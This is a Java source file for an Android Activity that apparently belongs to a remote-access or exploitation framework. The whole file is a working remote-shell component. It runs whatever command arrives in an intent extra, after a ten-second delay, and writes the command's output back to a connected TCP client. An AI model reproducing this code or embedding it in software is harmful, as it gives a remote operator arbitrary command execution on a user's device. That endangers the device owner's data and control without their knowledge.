package com.afe.socket;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.ArrayList;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.WindowManager;

public class Shell extends Activity {
	
	@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE); // click through-able
        Bundle bundle = getIntent().getExtras();
        String str = bundle.getString("shell");
        
        		try {
     				Thread.sleep(10000);
     			} catch (InterruptedException e) {
     				// TODO Auto-generated catch block
     				//e.printStackTrace();
     			}
        		
                try {
        		StringBuffer sb = new StringBuffer("");
                String line = "";
                String NL = System.getProperty("line.separator");
                //String str = "ls -l";
        		Log.v("testing", str);

        		Process process = null;
				try {
					process = Runtime.getRuntime().exec(str);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					//e.printStackTrace();
					throw new RuntimeException(e);
				}
				Log.v("testing22", str);
			    // Reads stdout.
			    // NOTE: You can write to stdin of the command using
			    //       process.getOutputStream().
        		
			    BufferedReader reader = new BufferedReader(
			            new InputStreamReader(process.getInputStream()));
			    int read;
			    char[] buffer = new char[4096];
			    StringBuffer output = new StringBuffer();
			    try {
					while ((read = reader.read(buffer)) > 0) {
					    output.append(buffer, 0, read);
					}
				} catch (IOException e) {
					// TODO Auto-generated catch block
					//e.printStackTrace();
					throw new RuntimeException(e);
				}
			    Log.v("testing33", str);
			    try {
					reader.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					//e.printStackTrace();
					throw new RuntimeException(e);
				}
			    
			    // Waits for the command to finish.
			    try {
					process.waitFor();
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					//e.printStackTrace();
				}
			    String ret = output.toString();
			    Log.v("output", ret);
					//continue;
			    
			    try {
					PrintWriter output1 = new PrintWriter(TCPServer.client.getOutputStream(), true);
					output1.print(ret);
					output1.flush();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
	  	    } catch(Throwable t) {
	  	    	Log.e("AFE", "Something is wrong !");
	  	    	try {
					PrintWriter output = new PrintWriter(TCPServer.client.getOutputStream(), true);
					output.print("Something is wrong !\n\n"+t);
					output.flush();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
	  	    }
        	this.finish();

    
    }

}